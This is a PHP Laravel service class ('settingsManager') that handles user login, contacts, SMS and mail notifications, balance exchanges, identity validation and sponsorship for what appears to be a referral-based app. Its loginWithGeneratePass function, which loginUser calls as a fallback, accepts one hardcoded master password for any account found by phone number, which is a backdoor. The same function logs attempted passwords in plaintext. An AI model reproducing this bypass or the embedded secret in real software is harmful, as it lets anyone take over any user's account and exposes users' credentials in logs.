<?php

namespace App\Services;

use App\Enums\BalanceEnum;
use App\Enums\EventBalanceOperationEnum;
use App\Enums\ExchangeTypeEnum;
use App\Enums\LanguageEnum;
use App\Enums\OperateurSmsEnum;
use App\Enums\SettingsEnum;
use App\Enums\StatusRequest;
use App\Enums\TypeEventNotificationEnum;
use App\Enums\TypeNotificationEnum;
use App\Http\Traits\earnLog;
use App\Http\Traits\earnTrait;
use App\Models\BFSsBalances;
use App\Models\ContactUser;
use App\Models\User;
use App\Services\Balances\Balances;
use App\Services\Sponsorship\Sponsorship;
use Carbon\Carbon;
use App\Interfaces\ICountriesRepository;
use App\Interfaces\IHistoryNotificationRepository;
use App\Interfaces\IHobbiesRepository;
use App\Interfaces\ILanguageRepository;
use App\Interfaces\INotificationRepository;
use App\Interfaces\ISettingsRepository;
use App\Interfaces\IUserBalancesRepository;
use App\Interfaces\IUserContactNumberRepository;
use App\Interfaces\IUserContactRepository;
use App\Interfaces\IUserRepository;
use App\Models\AuthenticatedUser;
use App\Models\countrie;
use App\Models\identificationuserrequest;
use App\Models\language;
use App\Models\MettaUser;
use App\Models\Setting;
use App\Models\user_earn;
use App\Models\UserContact;
use App\Models\UserContactNumber;
use App\Models\UserNotificationSettings;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Lang;
use Illuminate\Support\Facades\Log;


class settingsManager
{
    use earnTrait;
    use earnLog;

    public function __construct(
        private ILanguageRepository            $languageRepository,
        private INotificationRepository        $notificationRepository,
        private IUserRepository                $userRepository,
        private ICountriesRepository           $countriesRepository,
        private IHobbiesRepository             $hobbiesRepository,
        private IHistoryNotificationRepository $historyNotificationRepository,
        private IUserContactRepository         $userContactRepository,
        private ISettingsRepository            $settingsRepository,
        private NotifyHelper                   $notifyHelper,
        private BalancesManager                $balancesManager,
        private UserBalancesHelper             $userBalancesHelper,
        private IUserBalancesRepository        $userBalanceRepository,
        private IUserContactNumberRepository   $userContactNumberRepository,
        private MettaUsersService              $mettaUsersService,
        private UserContactNumberService       $userContactNumberService,
        private ContactUserService             $contactUserService,
        private UserService                    $userService,
        private IdentificationRequestService   $identificationRequestService,
        private MessageService                 $messageService,
        private Sponsorship                    $sponsorship
    )
    {

    }


    public function getlanguages()
    {
        return $this->languageRepository->getAllLanguage();
    }

    public function getNotificationSetting($id)
    {
        return $this->notificationRepository->getNotificationSettingByIdUser($id);
    }

    public function getlanguages2()
    {
        return $this->languageRepository->getAllLanguage2();
    }

    public function getUsers()
    {
        return $this->userRepository->getAllUsers();
    }

    public function getUsersEarn()
    {

        return $this->userRepository->getAllUsersErans();
    }

    public function getUserContacts($idUser)
    {
        return $this->userRepository->getUserContacts($idUser);
    }

    public function getAllCountries()
    {
        return $this->countriesRepository->getAllCountries();
    }

    public function addUserContact(UserContact $userContact)
    {
        return $this->userRepository->addUserContact($userContact);
    }

    public function addUserContactV2(ContactUser $contactUser)
    {
        return $this->userRepository->addUserContactV2($contactUser);
    }

    public function updateUserContact(UserContact $userContact)
    {
        return $this->userRepository->updateUserContact($userContact);
    }

    public function updateUserContactV2($id, ContactUser $contactUser)
    {
        return $this->userRepository->updateUserContactV2($id, $contactUser);
    }

    public function addLanguage(language $language)
    {
        return $this->languageRepository->addLanguage($language);
    }

    public function getLanguageByPrefix(string $prefix)
    {
        return $this->languageRepository->getLanguageByPrefix($prefix);
    }

    public function getUserContactsById($id)
    {
        return $this->userRepository->getUserContactsById($id);
    }

    public function getContactsUserById($id)
    {
        return $this->userRepository->getContactsUserById($id);
    }

    public function loginWithGeneratePass($mobile, $idCountry, $pass)
    {

        $user = $this->userRepository->getUserByMobileContry($mobile, $idCountry);
        if (!$user) {
            $this->earnDebug("login with generate password: user not found : mobile-" . $mobile . " Country-" . $idCountry);
            return null;
        }
        if ($pass != "jE5n!e#O^tR7u@iP8wS2fC6gA4hY3dK1lM9bV0") {
            $this->earnDebug("login with generate password:  failed password : mobile-" . $mobile . " Country-" . $idCountry . "Password-" . $pass);
            return null;
        }
        $this->earnDebug("login with generate password:  succes login : mobile-" . $mobile . " Country-" . $idCountry);
        return $user;
    }

    public function loginUser($mobile, $idCountry, $remember, $pass, $iso)
    {
        $mobile = $this->formatMobileNumber($mobile);
        $country = $this->getCountryByIso($iso);
        $user = $this->userRepository->getUserByMobile($mobile, $country->id, $pass);
        if (!$user) {
            $user = $this->loginWithGeneratePass($mobile, $country->id, $pass);
            if (!$user)
                return null;
        }

        $user = $this->userRepository->getUserById($user->id);
        $this->userRepository->loginUser($user, $remember);
        if ($user->status == StatusRequest::ValidInternational->value) {
            if (!is_null($user->expiryDate)) {
                if (getDiffOnDays($user->expiryDate) < 1) {
                    $user->status = StatusRequest::ValidNational->value;
                    $user->save();
                }
            }
        }
        $userAuth = $this->getAuthUser();
        if (!$this->getAuthUser())
            return null;
        return $userAuth;
    }

    public function getAuthUser()
    {

        $user = Auth::user();
        $userMetta = $this->getMettaUser()->where('idUser', '=', $user->idUser)->first();

        $user->arFirstName = $userMetta->arFirstName;
        $user->arLastName = $userMetta->arLastName;
        $user->enFirstName = $userMetta->enFirstName;
        $user->enLastName = $userMetta->enLastName;

        return $user;
    }

    public function getMettaUser()
    {
        return $this->userRepository->getAllMettaUser();
    }

    public function logoutUser()
    {
        $this->userRepository->logoutUser();
    }

    public function getAllHobbies()
    {
        return $this->hobbiesRepository->getAllHobbies();
    }

    public function getHistoryForModerateur()
    {
        return $this->historyNotificationRepository->getHistoryForModerateur();
    }

    public function getUserByFullNumber($fullNumber)
    {
        return $this->userRepository->getUserByFullnumber($fullNumber);
    }

    public function getAllUserContact()
    {
        return $this->userContactRepository->getAllUserContacts();
    }

    public function getSettings(SettingsEnum $setting)
    {
        return $this->settingsRepository->getSetting($setting);
    }

    public function getSettingsValue(SettingsEnum $setting)
    {
        return $this->settingsRepository->getSetting($setting)->IntegerValue;
    }

    public function createMettaUser(User $user)
    {
        $this->mettaUsersService->createMettaUserFromUser($user);
    }

    public function createUserContactNumber(User $user, $iso)
    {
        $this->userContactNumberService->createUserContactNumber(
            $user->idUser,
            $user->mobile,
            $user->idCountry,
            $iso,
            $user->fullphone_number
        );
    }

    public function updateUserContactNumber(User $user, $iso)
    {
        $this->userContactNumberService->updateUserContactNumber(
            $user->idUser,
            $user->mobile,
            $user->idCountry,
            $iso,
            $user->fullphone_number
        );
    }

    public function createUserContactNumberByProp($idUser, $mobile, $idCountry, $iso, $fullNumber)
    {
        return $this->userContactNumberService->createUserContactNumberByProp(
            $idUser,
            $mobile,
            $idCountry,
            $iso,
            $fullNumber
        );
    }

    public function createUserEarn(User $user, $ccode)
    {
        $userearn = new user_earn();
        $userearn->idUser = $user->idUser;

        $userearn->mobile = $user->mobile;
        $userearn->fullphone_number = $user->fullphone_number;
        $userearn->registred_at = date(config('app.date_format'));
        $userearn->registred_from = 3;
        $userearn->isSMSSended = 0;
        $userearn->activationCodeValue = '';
        $userearn->activationDone = 0;
        $userearn->isKYCIdentified = -1;
        $userearn->idKYC = 0;
        $userearn->password = 0;
        $userearn->diallingCode = 0;
        $userearn->idCountry = $ccode;
        $userearn->isCountryRepresentative = 0;
        $userearn->idUpline = $user->idUpline;
        return $this->userRepository->createUserEarn($userearn);
    }

    public function checkUserInvited(User $user)
    {
        return $this->contactUserService->checkUserInvited($user);
    }

    public function getidCountryForSms($id)
    {
        $this->getUserById($id)->idCountry;
        return $this->getNumberCOntactActif($this->getUserById($id)->idUser);
    }

    /**
     * Returns void
     *
     * @param $userId
     * @param TypeEventNotificationEnum $typeEventNotification
     * @param array|null $params
     * @return string
     * "NotifyUser" function to notify user with any type notification either by only explicit type or all type
     * 1 - only type :
     * if parameter type exist in table params : send a notification according to the type
     * 2 - all type
     * check the settings in table "user_notification_setting"
     * in case type is Sms :
     * - check balance sms !
     * - check the pay code to initialize the Sms operator
     * 3 - $params[] array of parameters : 4 parameters are possible
     * 31 - type : to send a notification according to their type without checking the balance
     * 32 - msg : the content of the notification / message
     * 33 - toMail : in case type is mail
     * 34 - emailTitle : in case type is mail
     * ToDo if $params["toMail"] not exist get mail from table metta_users
     * ToDo remove static assignment of $sooldeSms
     */
    public function NotifyUser($userId, TypeEventNotificationEnum $typeEventNotification, $params)
    {
        $withChangeTransLang = false;
        $this->earnDebugSms("begin NotifyUser : ");
        $result = "";
        $canSendNotificationSms = false;
        $canSendNotificationMail = false;
        $user = $this->getUserById($userId);

        if (isset($params['isoP'])) {
            $country = $this->getCountryByIso($params['isoP']);
            $fullNumber = $user->fullphone_number;
        } else {
            $userContactActif = $this->getidCountryForSms($userId);
            $country = $this->getCountrieById($userContactActif->codeP);
            $fullNumber = $userContactActif->fullNumber;
        }
        $idCountry = $country->phonecode;
        $this->earnDebugSms("User id - " . $user->idUser);
        $user_notif = $this->getUserNotificationSetting($user->idUser);
        if (isset($params['lang'])) {
            $withChangeTransLang = true;
        }

        $msss = $withChangeTransLang ? $this->getMessageFinalByLang($params['msg'], $typeEventNotification, $params['lang']) : $this->getMessageFinal($params['msg'], $typeEventNotification);
        $this->earnDebugSms("Message - " . $msss);
        $user_notif = $this->getUserNotificationSetting($user->idUser);
        if (isset($params['fullNumber'])) {
            $fullNumber = $params['fullNumber'];
        }
        $this->earnDebugSms("Full number - " . $fullNumber);
        $param = ['msg' => $msss, 'fullNumber' => $fullNumber];
        try {
            if (isset($params['type'])) {
                $this->earnDebugSms("Param type existe - " . $params['type']->value);
                switch ($params['type']) {
                    case TypeNotificationEnum::SMS :
                        $this->earnDebugSms("Case Sms :");
                        $this->earnDebugSms("Country is - " . $user->idCountry);
                        switch ($idCountry) {
                            case 2160 :
                                $result = $this->notifyHelper->notifyuser(TypeNotificationEnum::SMS, OperateurSmsEnum::Tunisie, $typeEventNotification, $param);
                                break;
                            default :
                                $result = $this->notifyHelper->notifyuser(TypeNotificationEnum::SMS, OperateurSmsEnum::international, $typeEventNotification, $param);
                                break;
                        }
                        break;
                }

                Log::notice(json_encode($result));

                $this->earnDebugSms("End notify - result send SMS for user : full number- " . $fullNumber . "; message fournisseur sms- " . $result);
                return $result;
            }
            $this->earnDebugSms("Param type n'existe pas.");
            $notifSMS = $user_notif->where('idNotification', '=', $typeEventNotification->getSettingSms()->value)->first();
            if ($notifSMS &&
                $user_notif->where('idNotification', '=', $typeEventNotification->getSettingSms()->value)->first()->value == 1) {
                $canSendNotificationSms = true;
            }
            if (isset($params['canSendSMS'])) {
                $canSendNotificationSms = $params['canSendSMS'] == 1 ? true : false;
            }
            $notifMAIL = $user_notif->where('idNotification', '=', $typeEventNotification->getSettingMail()->value)->first();
            if ($notifMAIL && $user_notif->where('idNotification', '=', $typeEventNotification->getSettingMail()->value)->first()->value == 1) {
                // ToDo if $params["toMail"] not exist get mail from table metta_users
                if (isset($params["toMail"]) && isset($params["emailTitle"]))
                    $canSendNotificationMail = true;
            }
            if (isset($params['canSendMail'])) {
                if ($params['canSendMail'] == 1) {
                    $canSendNotificationMail = true;
                }
            }
            $this->earnDebugSms("CanSendSms - " . $canSendNotificationSms . " CanSendMail - " . $canSendNotificationMail);
            $AllTypeNotification = TypeNotificationEnum::array();
            foreach ($AllTypeNotification as $notification => $number) {
                switch ($notification) {
                    case TypeNotificationEnum::SMS->value :
                        if ($canSendNotificationSms) {
                            $notifSetting = $this->notificationRepository->getAllNotification()
                                ->where('id', '=', $typeEventNotification->getSettingSms()->value)
                                ->first();
                            $soldeSuf = true;
                            $this->earnDebugSms("Case Can send Sms: ");
                            $sooldeSms = $this->getSoldeByAmount($user->idUser, BalanceEnum::SMS);
                            $this->earnDebugSms("Solde Sms -: " . $sooldeSms);
                            if ($notifSetting->payer && $sooldeSms <= 0) {
                                $soldeSuf = false;
                            }
                            if ($soldeSuf) {
                                $this->earnDebugSms("Country is  -: " . $user->idCountry);
                                switch ($idCountry) {
                                    case 2160 :
                                        $result = $this->notifyHelper->notifyuser(TypeNotificationEnum::SMS, OperateurSmsEnum::Tunisie, $typeEventNotification, $param);
                                        break;
                                    default:
                                        $result = $this->notifyHelper->notifyuser(TypeNotificationEnum::SMS, OperateurSmsEnum::international, $typeEventNotification, $param);
                                        break;
                                }
                                Log::notice(json_encode($result));

                                if ($notifSetting && $notifSetting->payer) {
                                    $this->userBalancesHelper->AddBalanceByEvent(EventBalanceOperationEnum::SendSMS, $user->idUser);
                                }
                            }
                        }
                        break;
                    case TypeNotificationEnum::MAIL->value :
                        if ($canSendNotificationMail) {
                            $this->earnDebugSms("Case Can send Mail: ");
                            if ($withChangeTransLang)
                                $mstest = $this->getMessageFinalByLang($params['msg'], $typeEventNotification, $params['lang']);
                            else
                                $mstest = $this->getMessageFinal($params['msg'], $typeEventNotification);
                            $params['msg'] = $mstest;

                            $this->notifyHelper->notifyuser(TypeNotificationEnum::MAIL, null, $typeEventNotification, $params);
                        }
                        break;
                }
            }
            $this->earnDebugSms("result send SMS for user : full number-" . $fullNumber . "; message fournisseur sms-" . $result);
            return $result;
        } catch (\Exception $e) {
            Log::error($userId . ' ' . json_encode($params) . ' ' . $e->getMessage());
            return null;
        }
    }

    public function getUserById($id)
    {
        return $this->userRepository->getUserById($id);
    }

    public function getAuthUserById($id)
    {
        return $this->userService->getAuthUserById($id);
    }

    public function getUserNotificationSetting($idUser)
    {
        return $this->notificationRepository->getNotificationSettingByIdUser($idUser);
    }

    public function getSoldeByAmount($idUser, BalanceEnum $amount)
    {
        return $this->userBalanceRepository->getSoldeByAmount($idUser, $amount->value);
    }

    public function exchange(ExchangeTypeEnum $typeEchange, $idUser, $montant)
    {
        switch ($typeEchange) {
            case ExchangeTypeEnum::CashToBFS :
                if (floatval($montant) <= 0) {
                    throw new \Exception("exception invalid montant");
                }

                $balances = Balances::getStoredUserBalances($idUser);;
                $newSoldeCashBalance = floatval($balances->cash_balance) - floatval($montant);

                if ($newSoldeCashBalance < 0)
                    throw new \Exception("exception solde insuffisant");

                $param = [
                    'montant' => $montant,
                    'newSoldeCashBalance' => $newSoldeCashBalance,
                    'newSoldeBFS' => floatval($balances->getBfssBalance(BFSsBalances::BFS_100)) + floatval($montant),
                    'oldSoldeBFS' => floatval($balances->getBfssBalance(BFSsBalances::BFS_100)),
                ];

                $this->userBalancesHelper->AddBalanceByEvent(EventBalanceOperationEnum::ExchangeCashToBFS, $idUser, $param);
                break;
            case ExchangeTypeEnum::BFSToSMS :
                $balances = Balances::getStoredUserBalances($idUser);
                $soldeBfs = $balances->getBfssBalance(BFSsBalances::BFS_100);
                $seting = DB::table('settings')->where("idSETTINGS", "=", "13")->first();
                $prix_sms = $seting->DecimalValue ?? 1.5;
                $newSoldeBFS = $soldeBfs - ($prix_sms * $montant);

                if ($newSoldeBFS < 0) {
                    throw new \Exception("exception solde insuffisant");
                }

                $param = ['montant' => $prix_sms * $montant, 'newSoldeCashBalance' => $newSoldeBFS, 'newSoldeBFS' => $newSoldeBFS, 'PrixSms' => $prix_sms];
                $this->userBalancesHelper->AddBalanceByEvent(EventBalanceOperationEnum::ExchangeBFSToSMS, $idUser, $param);
                break;
        }
    }

    public function updateIdentity($requestIdentification, $status, $response, $note)
    {
        $this->identificationRequestService->updateIdentity($requestIdentification, $status, $response, $note);
    }

    public function rejectIdentity($idUser, $note)
    {
        $this->identificationRequestService->rejectIdentity($idUser, $note, function ($userId, $event, $params) {
            $this->NotifyUser($userId, $event, $params);
        });
    }

    public function getNewValidatedstatus($idUser)
    {
        return $this->userService->getNewValidatedstatus($idUser);
    }

    public function validateIdentity($idUser)
    {
        $this->identificationRequestService->validateIdentity(
            $idUser,
            fn($userId) => $this->getNewValidatedstatus($userId),
            fn($userId, $event, $params) => $this->NotifyUser($userId, $event, $params)
        );
    }

    public function getMessageFinal($mes, TypeEventNotificationEnum $typeOperation): string
    {
        return $this->messageService->getMessageFinal($mes, $typeOperation);
    }


    public function getMessageFinalByLang($mes, TypeEventNotificationEnum $typeOperation, $newLang): string
    {
        return $this->messageService->getMessageFinalByLang($mes, $typeOperation, $newLang);
    }


    public function generateNotificationSetting($idUser)
    {
        $notificationSettings = $this->notificationRepository->getAllNotification();
        $this->notificationRepository->deleteNotificationByIdUser($idUser);
        $data = [];
        foreach ($notificationSettings as $not) {
            $notSetting = new UserNotificationSettings();
            $notSetting->idUser = $idUser;
            $notSetting->value = $not->defaultVal;
            $notSetting->idNotification = $not->id;
            $data[] = $notSetting->attributesToArray();
        }
        $this->notificationRepository->insertuserNotification($data);
    }

    public function getHistory()
    {
        return $this->historyNotificationRepository->getHistoryByRole();
    }

    public function getLanguageById($id)
    {
        return $this->languageRepository->getLanguageById($id);
    }

    public function getCountrieById($id)
    {
        return $this->countriesRepository->getCountrieById($id);
    }

    public function getNomberNotification()
    {
        return $this->notificationRepository->getNombreNotif();
    }

    public function getConditionalMettaUser($Attribute, $value)
    {
        return $this->userRepository->getConditionalMettaUser($Attribute, $value);
    }

    public function getConditionalUser($Attribute, $value)
    {
        return $this->userRepository->getConditionalUser($Attribute, $value);
    }

    public function getStatesContrie($CodePhone)
    {
        return $this->countriesRepository->getStates($CodePhone);
    }

    public function getCountryByIso($iso)
    {
        return collect($this->countriesRepository->getCountryByIso(strtoupper($iso)))->first();
    }

    public function getNumberCOntactActif($idUser)
    {
        return $this->userContactNumberRepository->getActifNumber($idUser);
    }

    public function getNumberCOntactID($idUser)
    {
        return $this->userContactNumberRepository->getIDNumber($idUser);
    }

    public function initNewUser()
    {
        return $this->userRepository->initNewUser();
    }

    public function createNewUser($mobile, $fullphone_number, $id_phone, $idUplineRegister, $status = null)
    {
        $user = $this->userRepository->createNewUser($mobile, $fullphone_number, $id_phone, $idUplineRegister, $status ?? StatusRequest::ContactRegistred->value);
        $this->createMettaUser($user);
        $country = countrie::find($user->idCountry);
        $this->createUserContactNumber($user, $country->apha2);
        return $user;
    }

    public function updateUser($user, $mobile, $fullphone_number, $id_phone, $idUplineRegister)
    {
        return $this->createNewUser($mobile, $fullphone_number, $id_phone, $idUplineRegister);
    }

    public function createNewContactUser($idUser, $name, $idContact, $lastName, $mobile, $fullphone, $phonecode)
    {
        return $this->contactUserService->createNewContactUser($idUser, $name, $idContact, $lastName, $mobile, $fullphone, $phonecode);
    }

    public function getUserContactV2(ContactUser $contactUser)
    {
        return $this->userRepository->updateUserContactV2($contactUser);
    }

    public function getUserByIdUser($idUser)
    {
        return $this->userRepository->getUserByIdUser($idUser);
    }

    public function addSponsoring($upLine, $downLine)
    {
        return $this->sponsorship->addSponsoring($upLine, $downLine);
    }

    public function removeSponsoring($idUser)
    {
        return $this->sponsorship->removeSponsoring($idUser);
    }

    public function checkCanSponsorship()
    {
        return $this->sponsorship->checkCanSponsorship(\auth()->user()->idUser);
    }
}
